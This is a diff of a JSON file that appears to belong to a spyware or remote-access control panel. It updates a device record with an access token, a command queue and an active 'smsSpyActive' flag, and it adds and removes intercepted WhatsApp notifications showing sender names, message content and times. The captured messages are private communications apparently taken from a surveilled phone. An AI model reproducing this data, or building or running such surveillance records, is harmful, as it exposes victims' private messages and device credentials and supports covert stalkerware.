@@ -108,7 +108,7 @@
     "deviceName": "HP-RASKA321-52A8",
     "ownerUsername": "Amsal.sim",
     "token": "906fc9b5e5fd7ed9167409d9979fb58b",
-    "lastSeen": 1776002812601,
+    "lastSeen": 1776002842493,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-11T16:02:07.690Z",
@@ -124,6 +124,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "Menghapus obrolan terpilih…",
+        "content": "28%",
+        "time": "12/04 21:07",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776002842507
+      },
       {
         "appName": "WhatsApp",
         "sender": "𓆚꧁𝐿𝐸𝑍𝐴 𝐿𝑃𝑀꧂𓆚",
@@ -4115,14 +4123,6 @@
         "time": "12/04 00:12",
         "pkg": "com.whatsapp",
         "receivedAt": 1775927541186
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "𝟐𝟑 𝐕𝐄𝐋𝐂𝐘𝐄𝐈",
-        "content": "~ tapzyUrPrblm: gambleh",
-        "time": "12/04 00:12",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775927537414
       }
     ],
     "galleryPhotos": [],
